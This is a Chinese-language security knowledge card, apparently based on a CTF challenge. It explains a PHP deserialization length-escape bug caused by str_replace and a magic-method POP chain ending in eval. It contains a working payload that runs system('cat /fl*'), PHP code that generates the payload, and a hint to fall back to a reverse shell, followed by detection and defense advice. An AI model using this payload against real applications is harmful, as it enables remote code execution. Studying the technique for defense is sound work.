---
id: web-php-deserialization-str-replace-length-lengthening-pop-eval
title: PHP 反序列化变长字符逃逸：str_replace 短替换长 + Frieren/Himmel/Fern/Stark POP 链到 eval RCE
type: scenario
domain: web
path: web/php/deserialization
technique: str-replace-length-lengthening-escape-pop-chain-eval
tags:
- php
- deserialization
- character-escape
- length-mismatch
- str-replace
- pop-chain
- eval
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:20:10+08:00'
  notes: 已对照原文与 14 张截图核对：magic() 的 bad(+2)/jinx(+1) 替换、Frieren::__wakeup→Himmel::__toString→Fern::__invoke→Stark::__get→eval 链、逃逸长度方程均一致；原文为 CTF 环境无组件版本；未实际运行 PoC。
url: /docs/web/php/deserialization/web-php-deserialization-str-replace-length-lengthening-pop-eval/
draft: false
kb_aliases:
- 让人变幸运的魔法
- 字符逃逸变长
- bad 替换 lucky
- jinx 替换 lucky
- 序列化长度逃逸
- Frieren POP 链
- Himmel __toString
- Fern __invoke
- Stark __get eval
---

## 一句话结论

应用先 `serialize(new Frieren($spell))`，再用 `str_replace` 把 `bad`/`jinx` 等短词替换成更长的 `lucky`，最后 `unserialize`；替换后字符串实际变长但 `s:<长度>` 声明不变，解析器只读取原长度，剩余字节被当成序列化结构，攻击者可让逃逸部分伪造 `target` 属性，接上 `Frieren::__wakeup → Himmel::__toString → Fern::__invoke → Stark::__get → eval` 的 POP 链执行任意代码。

## 原理

- **PHP 序列化长度语义**：`s:<N>:"<内容>";` 中的 N 是声明长度；`unserialize()` 严格按 N 读取内容，不校验实际引号位置。若序列化后对文本做改变长度的替换，声明长度就会与实际内容脱钩。
- **变长方向**：本题 `magic()` 依次把 `unlucky`(7)、`bad`(3)、`jinx`(4)、`unfortunate`(11) 替换为 `lucky`(5)。`bad → lucky` 净增 2 字节，`jinx → lucky` 净增 1 字节；`unlucky`/`unfortunate` 则净减。攻击者用大量 `bad`（+2）和少量 `jinx`（+1）凑出需要的净增量。
- **逃逸方程**：设原始 spell 内容为 `P + S`，P 为会膨胀的前缀，S 为以 `";` 开头的逃逸串。原始声明长度 `N = |P| + |S|`；替换后 P 膨胀 E 字节，内容实际长度 `N + E`。解析器读取 N 字节时，正好读完膨胀后的 P'，停在 S 的起始处；它期待闭合引号和分号，看到 S 开头的 `"` 和 `;` 就认为 spell 字符串结束，S 的剩余部分被解析为新的属性。因此需要 `E = |S|`，通过增删 `bad`/`jinx` 以及调整命令字符串（如 `cat /fl*`、`cat /f*`）微调长度。
- **POP 链**：
  - `Frieren::__wakeup()` 在 `target !== 'Nobody'` 时执行 `echo "成功让".$this->target."变得幸运!"`；把 `target` 设为对象会触发该对象的 `__toString()`。
  - `Himmel::__toString()` 在 `action === 'try'` 且 `sword !== "Sword of the Hero"` 时执行 `$func = $this->sword; $func();`；把 `sword` 设为 `Fern` 对象会触发 `Fern::__invoke()`。
  - `Fern::__invoke()` 访问 `$this->book->abliity`（注意拼写是 `abliity`）；`book` 指向 `Stark`，访问不存在的属性触发 `Stark::__get('abliity')`。
  - `Stark::__get()` 执行 `eval($this->ability)`；序列化时把 `ability` 设为公开动态属性 `system('cat /fl*');` 即可执行命令。`__get` 由 `abliity` 触发，但 eval 读取的是拼写正确的 `ability`，两者不需要同名。
- 这条链把“反序列化长度处理错误”与“魔术方法对象图”结合：长度逃逸负责写入任意属性，POP 链负责把属性转成代码执行。

## 触发条件

- 应用对用户输入先 `serialize()`，再经过 `str_replace`/`str_ireplace`/`preg_replace` 等改变长度的替换，最后 `unserialize()`。
- 被替换的关键字出现在攻击者可控的属性值中，且替换后长度增加（短词替换成长词）。
- 目标类存在可串联的魔术方法：`__wakeup`/`__destruct`（起点）、`__toString`（字符串化）、`__invoke`（可调用对象）、`__get`（未定义属性）以及 `eval`/`include` 等 sink。
- 攻击者知道序列化结构（属性名、顺序、声明长度）并能控制 POST 参数。
- 入口没有对反序列化数据做签名/结构校验，或允许实例化目标类。

## 利用步骤

1. 审计源码，确认 `serialize()` → `magic()`（`str_replace`）→ `unserialize()` 的顺序，计算每个关键字的长度差。
2. 画出魔术方法调用图，确定从 `__wakeup` 到 sink 的对象图：`Frieren->target=Himmel`、`Himmel->sword=Fern`、`Fern->book=Stark`、`Stark->ability=<命令>`。
3. 构造逃逸串 S：`";s:6:"target";O:6:"Himmel":2:{...}`，并计算 `|S|`。
4. 用 `bad`（+2）和 `jinx`（+1）凑出净增量 `E = |S|`；若差 1 字节，用 `jinx` 或调整命令字符串（`cat /fl*`、`cat /f*`、`cat /flag`）微调。
5. 提交 `spell=<bad/jinx 前缀><S>`；`unserialize` 后 `target` 被设为 Himmel 对象，`__wakeup` 触发整条 POP 链，命令执行结果随页面回显。
6. 若命令结果无回显，可把 sink 改为写文件/反弹 shell，或使用带外通道。

## PoC

```text
# 结构（省略 bad 重复次数，实际需按 |S| 精确凑长度）
spell=badbad...badjinx";s:6:"target";O:6:"Himmel":2:{s:5:"sword";O:4:"Fern":1:{s:4:"book";O:5:"Stark":1:{s:7:"ability";s:19:"system('cat /fl*');";}}s:6:"action";s:3:"try";}}
```

```php
// 本地生成：先算出逃逸串长度，再用 bad/jinx 凑净增量
$escape = '";s:6:"target";O:6:"Himmel":2:{s:5:"sword";O:4:"Fern":1:{s:4:"book";O:5:"Stark":1:{s:7:"ability";s:19:"system(\'cat /fl*\');";}}s:6:"action";s:3:"try";}}';
$need = strlen($escape);          // 需要的净增字节数
$prefix = str_repeat('bad', intdiv($need, 2)); // 每个 bad +2
if ($need % 2) { $prefix .= 'jinx'; }          // 奇数用 jinx +1
$payload = $prefix . $escape;
// POST spell=$payload
```

```text
# 链式调用
Frieren::__wakeup -> echo $target（Himmel 对象）
Himmel::__toString -> $func = $sword（Fern 对象）; $func()
Fern::__invoke -> $this->book->abliity（Stark 未定义属性）
Stark::__get('abliity') -> eval($this->ability)
```

## 变体与关联

- 替换方向变体：短→长（本卡，声明长度过小，剩余内容逃逸为结构）；长→短（声明长度过大，吞掉后续结构），见 [[web-php-deserialization-str-replace-length-shortening-escape]]。
- 替换函数变体：`str_ireplace`、`preg_replace`、`strtr`、HTML 实体编码、URL 解码等任何改变长度的后处理都可能造成同类逃逸。
- POP 链变体：`__destruct`/`__wakeup` 起点、`__toString`/`__get`/`__invoke` 中继、`eval`/`include`/`system` sink 可替换为其他类图；核心是属性可控 + 魔术方法自动触发。
- 关联：[[web-php-deserialization-wakeup-pregmatch-tostring-get-invoke-read]]（另一条 `__wakeup→__toString→__get→__invoke` 链）、[[web-php-deserialization-str-replace-length-shortening-escape]]（长度缩短方向）。

## 检测与防御

- 检测：请求参数中出现大量重复的 `bad`/`jinx` 等被替换词，后接 `";s:`、`O:` 等序列化结构片段；序列化字符串声明长度与实际内容不符；`unserialize` 调用点附近存在 `str_replace`/`preg_replace`。
- 防御：不要对序列化后的文本做改变长度的替换；如必须过滤，先反序列化到受限对象/数组，校验后再序列化；使用 `unserialize($data, ['allowed_classes' => [...]])` 白名单。
- 加固：移除不必要的 `__wakeup`/`__destruct`/`__toString`/`__get` 中的敏感操作；对反序列化数据做 HMAC 签名；改用 JSON。
